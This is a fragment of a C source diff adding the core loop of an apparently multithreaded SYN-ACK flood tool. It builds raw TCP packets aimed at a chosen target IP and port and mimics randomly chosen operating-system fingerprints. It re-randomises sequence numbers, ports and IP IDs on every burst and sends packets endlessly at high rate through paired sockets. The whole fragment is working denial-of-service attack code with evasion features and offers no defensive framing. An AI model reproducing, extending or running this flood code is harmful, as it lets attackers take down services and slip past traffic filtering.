+            unsigned int ts_base = (unsigned int)time(NULL) % 86400 * 250;
+
+            while(1) {
+                // Build batch of SYN-ACK packets
+                for(int b=0; b<SA_B; b++) {
+                    unsigned char *pkt = sabuf + (size_t)b * SA_MAXPKT;
+                    memset(pkt, 0, SA_MAXPKT);
+
+                    // Ethernet header
+                    if(use_afp){
+                        memcpy(pkt, gw_mac, 6);
+                        memcpy(pkt+6, src_mac, 6);
+                        pkt[12]=0x08; pkt[13]=0x00;
+                    }
+
+                    // Select random OS profile
+                    int prof = fast_rand() % sa_nprofiles;
+
+                    // IP Header
+                    struct iphdr *ih = (struct iphdr*)(pkt + NF_ETH);
+                    ih->ihl = 5;
+                    ih->version = 4;
+                    ih->tot_len = htons(NF_IP + SA_TCPLEN);
+                    ih->id = htons(fast_rand() & 0xFFFF);
+                    ih->frag_off = htons(0x4000); // DF — all modern OS set this
+                    ih->ttl = sa_profiles[prof].ttl;
+                    ih->protocol = IPPROTO_TCP;
+                    ih->saddr = src_ip;
+                    ih->daddr = bin_target_ip;
+
+                    // TCP Header — SYN+ACK
+                    struct tcphdr *th = (struct tcphdr*)(pkt + NF_ETH + NF_IP);
+                    th->source = htons((unsigned short)(1024 + (fast_rand() % 64000)));
+                    th->dest = bin_target_port;
+                    th->seq = htonl(fast_rand());
+                    th->ack_seq = htonl(fast_rand());
+                    th->doff = SA_TCPLEN / 4; // (20+20)/4 = 10
+                    th->syn = 1;
+                    th->ack = 1;
+                    th->window = htons(sa_profiles[prof].window);
+
+                    // TCP Options (20 bytes — realistic SYN-ACK option set)
+                    unsigned char *opt = pkt + NF_ETH + NF_IP + NF_TCP;
+                    // MSS (4 bytes): kind=2, len=4, value
+                    opt[0]=2; opt[1]=4;
+                    opt[2]=(sa_profiles[prof].mss >> 8) & 0xFF;
+                    opt[3]=sa_profiles[prof].mss & 0xFF;
+                    // SACK Permitted (2 bytes): kind=4, len=2
+                    opt[4]=4; opt[5]=2;
+                    // Timestamps (10 bytes): kind=8, len=10, tsval(4), tsecr(4)
+                    opt[6]=8; opt[7]=10;
+                    ts_base += 1 + (fast_rand() % 4); // realistic 250Hz monotonic
+                    *((unsigned int*)(opt+8)) = htonl(ts_base);
+                    *((unsigned int*)(opt+12)) = htonl(fast_rand()); // echo random tsval
+                    // NOP + Window Scale (4 bytes): NOP, kind=3, len=3, shift
+                    opt[16]=1; // NOP padding
+                    opt[17]=3; opt[18]=3; opt[19]=sa_profiles[prof].wscale;
+
+                    // IP Checksum
+                    ih->check = 0;
+                    unsigned short *iw = (unsigned short*)ih;
+                    unsigned int ic = 0;
+                    for(int i=0; i<10; i++) ic += iw[i];
+                    ic = (ic>>16)+(ic&0xFFFF); ic += (ic>>16);
+                    ih->check = (unsigned short)~ic;
+
+                    // TCP Checksum (pseudo header + TCP header + options)
+                    th->check = 0;
+                    unsigned short *tw = (unsigned short*)th;
+                    unsigned int cs = 0;
+                    cs += (src_ip & 0xFFFF) + (src_ip >> 16);
+                    cs += (bin_target_ip & 0xFFFF) + (bin_target_ip >> 16);
+                    cs += htons(IPPROTO_TCP);
+                    cs += htons(SA_TCPLEN);
+                    for(int i=0; i < SA_TCPLEN/2; i++) cs += tw[i];
+                    cs = (cs>>16)+(cs&0xFFFF); cs += (cs>>16);
+                    th->check = (unsigned short)~cs;
+                }
+
+                // Burst send via dual sockets with per-burst mutation
+                int cur_fd = fd_send;
+                unsigned long long tsent = 0, tbytes = 0;
+                for(int burst=0; burst<256; burst++) {
+                    int sent = sendmmsg(cur_fd, smsg, SA_B, 0);
+                    if(sent > 0) {
+                        tsent += sent;
+                        for(int i=0; i<sent; i++) tbytes += smsg[i].msg_hdr.msg_iov->iov_len;
+                    } else {
+                        if(errno==ENOBUFS||errno==EAGAIN) {
+                            cur_fd = (cur_fd == fd_send) ? fd_send2 : fd_send;
+                            continue;
+                        }
+                        break;
+                    }
+                    // Per-burst mutation: change seq/ack/sport/ipid for next burst
+                    for(int i=0; i<SA_B; i++) {
+                        unsigned char *bfr = sabuf + (size_t)i * SA_MAXPKT;
+                        struct iphdr *bih;
+                        struct tcphdr *bth;
+                        if(use_afp) {
+                            bih = (struct iphdr*)(bfr + NF_ETH);
+                            bth = (struct tcphdr*)(bfr + NF_ETH + NF_IP);
+                        } else {
+                            bih = (struct iphdr*)bfr;  // iov_base = bfr + NF_ETH, but bih is from original buffer
+                            bih = (struct iphdr*)(bfr + NF_ETH); // always index from full buffer
+                            bth = (struct tcphdr*)(bfr + NF_ETH + NF_IP);
+                        }
+
+                        // Mutate seq, ack_seq, source port, IP ID
+                        bth->seq = htonl(fast_rand());
+                        bth->ack_seq = htonl(fast_rand());
+                        bth->source = htons((unsigned short)(1024 + (fast_rand() % 64000)));
+                        bih->id = htons(fast_rand() & 0xFFFF);
+
+                        // Full IP checksum recalc (cheap — only 10 words)
+                        bih->check = 0;
+                        unsigned short *biw = (unsigned short*)bih;
+                        unsigned int bic = 0;
+                        for(int j=0; j<10; j++) bic += biw[j];
+                        bic = (bic>>16)+(bic&0xFFFF); bic += (bic>>16);
+                        bih->check = (unsigned short)~bic;
+
+                        // Full TCP checksum recalc
+                        bth->check = 0;
+                        unsigned short *btw = (unsigned short*)bth;
+                        unsigned int bcs = 0;
+                        bcs += (src_ip & 0xFFFF) + (src_ip >> 16);
+                        bcs += (bin_target_ip & 0xFFFF) + (bin_target_ip >> 16);
+                        bcs += htons(IPPROTO_TCP);
+                        bcs += htons(SA_TCPLEN);
+                        for(int j=0; j < SA_TCPLEN/2; j++) bcs += btw[j];
+                        bcs = (bcs>>16)+(bcs&0xFFFF); bcs += (bcs>>16);
+                        bth->check = (unsigned short)~bcs;
+                    }
+                }
+                thread_stats[tid].packets     += tsent;
+                thread_stats[tid].tcp_packets += tsent;
+                thread_stats[tid].raw_sent    += tsent;
+                thread_stats[tid].bytes       += tbytes;
+            }
+            free(sabuf); free(smsg); free(siov);
+        }
+
+        close(fd_send); close(fd_send2);
         return NULL;
     }
 
